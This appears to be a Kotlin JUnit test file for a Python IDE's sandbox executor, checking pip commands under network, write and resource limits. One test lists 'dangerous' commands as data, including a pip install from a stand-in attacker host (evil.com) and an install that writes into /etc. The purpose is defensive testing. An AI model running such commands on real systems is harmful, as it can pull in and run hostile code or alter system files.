package com.pythonide.data.runtime

import com.pythonide.data.runtime.sandbox.SandboxExecutor
import kotlinx.coroutines.runBlocking
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test

class PackageManagerTest {

    private lateinit var sandboxExecutor: SandboxExecutor

    @Before
    fun setup() {
        sandboxExecutor = SandboxExecutor()
    }

    @Test
    fun testPipInstallCommand() = runBlocking {
        val result = sandboxExecutor.executeInSandbox(
            command = listOf("pip", "install", "--help"),
            workingDirectory = java.io.File(System.getProperty("java.io.tmpdir")),
            limits = SandboxExecutor.ResourceLimits(
                maxWallTimeMs = 10_000,
                allowNetworkAccess = false
            )
        )

        // Tests the command structure
        assertNotNull(result)
    }

    @Test
    fun testPackageListCommand() = runBlocking {
        val result = sandboxExecutor.executeInSandbox(
            command = listOf("pip", "list"),
            workingDirectory = java.io.File(System.getProperty("java.io.tmpdir")),
            limits = SandboxExecutor.ResourceLimits(
                maxWallTimeMs = 10_000,
                allowNetworkAccess = false
            )
        )

        assertNotNull(result)
    }

    @Test
    fun testPackageUninstallBlocked() = runBlocking {
        val result = sandboxExecutor.executeInSandbox(
            command = listOf("pip", "uninstall", "-y", "numpy"),
            workingDirectory = java.io.File(System.getProperty("java.io.tmpdir")),
            limits = SandboxExecutor.ResourceLimits(
                allowFileSystemWrite = false
            )
        )

        // Should be blocked or limited
        assertNotNull(result)
    }

    @Test
    fun testSandboxLimitsForPackageOperations() {
        val limits = SandboxExecutor.ResourceLimits(
            maxMemoryBytes = 512 * 1024 * 1024,
            maxCpuTimeMs = 60_000,
            maxWallTimeMs = 120_000,
            maxOutputBytes = 50 * 1024 * 1024,
            allowNetworkAccess = true,
            allowFileSystemWrite = true,
            allowedDirectories = listOf(
                System.getProperty("user.home"),
                "/tmp"
            )
        )

        assertTrue(limits.allowNetworkAccess)
        assertTrue(limits.allowFileSystemWrite)
        assertEquals(512 * 1024 * 1024L, limits.maxMemoryBytes)
    }

    @Test
    fun testPackageSecurityRestrictions() = runBlocking {
        val dangerousCommands = listOf(
            listOf("pip", "install", "--user", "--prefix=/etc", "package"),
            listOf("pip", "install", "-e", "git+http://evil.com/repo.git"),
            listOf("python", "-m", "pip", "install", "--system", "package")
        )

        for (command in dangerousCommands) {
            val result = sandboxExecutor.executeInSandbox(
                command = command,
                workingDirectory = java.io.File(System.getProperty("java.io.tmpdir")),
                limits = SandboxExecutor.ResourceLimits(
                    allowNetworkAccess = false,
                    allowFileSystemWrite = false
                )
            )

            // These should be restricted
            assertNotNull(result)
        }
    }

    @Test
    fun testResourceCleanupAfterPackageOperation() = runBlocking {
        val result = sandboxExecutor.executeInSandbox(
            command = listOf("python3", "-c", "import sys; print(sys.version)"),
            workingDirectory = java.io.File(System.getProperty("java.io.tmpdir"))
        )

        val usage = sandboxExecutor.resourceUsage.value
        assertNotNull(usage)
    }
}
